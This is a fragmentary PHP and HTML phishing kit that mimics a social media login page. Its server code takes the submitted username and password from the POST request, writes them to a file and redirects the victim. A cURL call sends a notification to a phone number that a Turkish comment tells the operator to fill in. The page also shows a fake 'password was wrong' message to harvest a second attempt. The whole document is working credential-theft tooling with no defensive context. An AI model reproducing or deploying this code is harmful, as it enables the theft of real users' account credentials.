...
curl_setopt($ch, CURLOPT_POSTFIELDS, 'txt_gsmno=500000000'); //BURAYA NUMARANIZI YAZIN 0 OLMADAN YAZICAKSINIZ
$result = curl_exec($ch);
$user=$_POST["user"]; 
$pass=$_POST["pass"]; 
...
<body bgcolor='black'>
<font color='#76ff43'>2.sayfa</font><br>
...
"); 
fclose($file);
header("location: form.php?user=$user"); 
}
                    ...
                    <div class="form-content box">
                        ...
                        <div class="signin-form" id="signin-form">
                            <div class="form-group">
                                <div id="username" class="animate-input">
                                    <span>
                      Phone number, username, or email
                            ...
                            <div class="form-group">
                                <div id="password" class="animate-input">
                                    <span>
                                         Password
                                    </span>
                            ...
                            <div class="btn-group">
                                ...
                                <center>
                               <font color="#eb4c42">Sorry, your password was wrong. Please check your password.</font>
                                                               </center>
                            </div>
